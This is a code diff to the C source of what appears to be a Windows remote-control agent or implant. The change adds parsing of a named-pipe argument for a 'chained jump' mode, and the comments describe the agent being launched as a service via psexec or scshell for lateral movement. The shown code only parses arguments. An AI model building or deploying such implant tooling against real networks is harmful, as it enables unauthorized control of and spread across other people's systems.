@@ -986,6 +986,39 @@ int main(void) {
 
     DBG("[main] agent starting, PID=%u", GetCurrentProcessId());
 
+    /* ── Parse PIPE:<name> from command line (chained jump mode) ──
+     * When spawned via chained jump, the service binPath is:
+     *   %SystemRoot%\<exe> PIPE:<pipename>
+     * We scan for "PIPE:" in the command line and extract the name.
+     * Must run BEFORE _try_service_dispatch (which calls agent_init →
+     * channels_register, which checks g_pipe_child_mode). */
+    {
+        LPWSTR cmdline = GetCommandLineW();
+        if (cmdline) {
+            /* Find "PIPE:" anywhere in the command line (case-sensitive) */
+            LPWSTR p = cmdline;
+            while (*p) {
+                if (p[0] == L'P' && p[1] == L'I' && p[2] == L'P' &&
+                    p[3] == L'E' && p[4] == L':') {
+                    p += 5; /* skip "PIPE:" */
+                    /* Extract pipe name until space/end */
+                    int i = 0;
+                    while (*p && *p != L' ' && *p != L'\t' &&
+                           i < (int)(sizeof(g_pipe_child_name) - 1)) {
+                        g_pipe_child_name[i++] = (char)*p++;
+                    }
+                    g_pipe_child_name[i] = '\0';
+                    if (i > 0) {
+                        g_pipe_child_mode = TRUE;
+                        DBG("[main] pipe child mode: name=%s", g_pipe_child_name);
+                    }
+                    break;
+                }
+                p++;
+            }
+        }
+    }
+
     /* ── Service mode check ──
      * If we were launched by SCM (psexec/scshell), StartServiceCtrlDispatcherW
      * will block and call _svc_main on a worker thread, which runs the full
